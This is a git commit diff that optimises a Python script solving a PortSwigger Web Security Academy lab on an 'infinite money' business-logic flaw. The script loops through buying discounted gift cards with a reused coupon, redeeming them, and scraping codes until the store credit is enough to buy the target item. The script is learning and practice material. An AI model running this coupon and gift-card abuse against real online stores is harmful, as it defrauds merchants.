0f12d4da8ebbd3cd88ec3c6e15a594f08179c40c
ilveron <alessandromonetti@outlook.it>
2025-01-20 15:36:28 +0100

    Optimize infinite money logic flaw script

--- PortSwiggerLabs/Business Logic/Infinite money logic flaw/script.py
+++ PortSwiggerLabs/Business Logic/Infinite money logic flaw/script.py
@@ -3,11 +3,12 @@
 from lxml import html
 import requests
 from rich.console import Console
+from rich.progress import track
 
-Console()
-
-SERVER = "https://0a9b0092044865b18092b2df00b900df.web-security-academy.net"
+SERVER = "https://0ada005b044d1a8c82463323002e00d0.web-security-academy.net/"
 COUPON = "SIGNUP30"
+gift_cards_csrf_token = None
+cart_csrf_token = None
 
 session = requests.session()
 console = Console()
@@ -31,29 +32,37 @@ def get_store_credit():
     return float(store_credit)
     
 
-def add_gift_cards_to_cart():
-    session.post(f"{SERVER}/cart", data={"productId":2, "redir":"PRODUCT", "quantity":20})
+def add_gift_cards_to_cart(number_of_gift_cards):
+    session.post(f"{SERVER}/cart", data={"productId":2, "redir":"PRODUCT", "quantity":number_of_gift_cards})
     
 
 def add_coupon():
-    csrf_token = get_csrf_token("/cart")
-    session.post(f"{SERVER}/cart/coupon", data={"csrf":csrf_token,"coupon":"SIGNUP30"})
+    global cart_csrf_token
+    if not cart_csrf_token:
+        cart_csrf_token = get_csrf_token("/cart")
+    session.post(f"{SERVER}/cart/coupon", data={"csrf":cart_csrf_token,"coupon":"SIGNUP30"})
 
 
 def checkout():
-    csrf_token = get_csrf_token("/cart")
-    return session.post(f"{SERVER}/cart/checkout", data={"csrf":csrf_token})
+    global cart_csrf_token
+    if not cart_csrf_token:
+        cart_csrf_token = get_csrf_token("/cart")
+    return session.post(f"{SERVER}/cart/checkout", data={"csrf":cart_csrf_token})
 
 
-def get_gift_cards_list(response):
-    return [elem.text for elem in html.fromstring(response.content).xpath('//table[@class="is-table-numbers"]//td')][:20]
+def get_gift_cards_list(response, number_of_gift_cards):
+    return [elem.text for elem in html.fromstring(response.content).xpath('//table[@class="is-table-numbers"]//td')][:number_of_gift_cards]
 
 
 def redeem_gift_cards(gift_cards):   
-    csrf_token = get_csrf_token("my-account")
+    global gift_cards_csrf_token
+    if not gift_cards_csrf_token:
+        gift_cards_csrf_token = get_csrf_token("my-account")
+    
+
     for gift_card in gift_cards:
         console.log(f"Gift card: {gift_card}")
-        console.log(session.post(f"{SERVER}/gift-card", data={"csrf":csrf_token, "gift-card":gift_card}).status_code)
+        console.log(session.post(f"{SERVER}/gift-card", data={"csrf":gift_cards_csrf_token, "gift-card":gift_card}).status_code)
 
 
 def add_leet_jacket():
@@ -64,11 +73,13 @@ with console.status("Logging in"):
 
 store_credit = get_store_credit()
 while store_credit < 1337.0*0.7:
+    number_of_gift_cards = min(99, int(store_credit // (10*0.7)))  # Each gift card costs $10 - 30% discount
+    console.log(f"Number of gift cards: {number_of_gift_cards}")
     with console.status("Buying gift cards"):
-        add_gift_cards_to_cart()
+        add_gift_cards_to_cart(number_of_gift_cards)
         add_coupon()
         response = checkout()
-        gift_cards = get_gift_cards_list(response)
+        gift_cards = get_gift_cards_list(response, number_of_gift_cards)
     
     with console.status("Reedeeming gift cards"):
         redeem_gift_cards(gift_cards)
